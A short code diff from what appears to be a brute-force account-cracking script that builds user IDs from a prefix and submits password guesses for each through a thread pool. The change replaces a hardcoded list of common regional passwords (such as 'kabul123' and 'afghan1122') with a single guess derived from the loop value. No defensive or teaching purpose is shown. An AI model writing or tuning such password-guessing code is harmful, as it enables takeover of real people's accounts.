@@ -365,7 +365,7 @@ def pass1():
         print('\033[1;97m====================================================') 
         for love in user:
             uid = code+love
-            pwx = [malik12345,khankhan,afghanistan,kabul1122,kabul123,afghan123,afghan1122,afghan@123,AFGHAN1122,AFGHAN,afghan,love123,600700,10002000,786786,100200,]
+            pwx = [love,]
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
